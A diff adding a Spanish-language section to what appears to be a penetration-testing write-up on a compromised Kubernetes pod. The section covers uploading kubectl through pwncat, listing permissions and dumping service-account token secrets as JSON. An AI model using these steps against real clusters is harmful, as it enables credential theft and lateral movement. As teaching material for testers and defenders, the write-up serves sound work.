@@ -43,8 +43,72 @@ Hay varios indicios:
    KUBERNETES_SERVICE_HOST=
    KUBERNETES_PORT=
    ...
+   GRAFANA_...=
+   SYRINGE_...=
    ```
+
+
+## Instalar kubectl
+
+`kubectl`es la herramienta que permite gestionar un cluster de Kubernetes. Por tanto, es imprescindible para poder ejecurtarlo en el pod comprometido.
+
+Una opción es subirlo al pod desde la maquina atacante con un `upload`, hacerlo accesible con un servidor web, ...
+
+```console
+cd /tmp
+
+pwncat$ upload ./kubectl
+
+chmod +x ./kubectl
+
+```
+
+Una vez disponemos de `kubectl` podemos comenzar a lanzar comandos contra el cluster de kubernetes.
+
+Lo primero que podemos hacer es ver qué podemos hacer en  el clúster. Para ello, el siguiente comando nos dará esa respuesta
+```console
+
+$ ./kubectl auth can-i --list 
+
+...
+secrets []     []       [get list]
+   [/openapi]  []       [get]       
+    [/version] []       [get]      
+...
+```
+
+Lo más interesante es que `secrets` son accesibles:
+```console
+
+$ ./kubectl get secrets
+
+default-token-xxxxx   kubernetes.io/service-account-token    3  24d
+developer-token-yyy   kubernetes.io/service-account-token    3  24d
    
+...
+```
+Para ver esto `secrets` se puede usar:
+
+```console
+$ ./kubectl get secrets developer-token-yyy -o json
+
+{
+   data:{
+      ...
+   }
+}
+...
+```
+
+Probablemente no tengamos permisos para ver otros pods que estén en ejecución:
+
+```console
+$ ./kubectl get pods
+Error from server (Forbidden): ...
+```
+
+
+
 
 
 
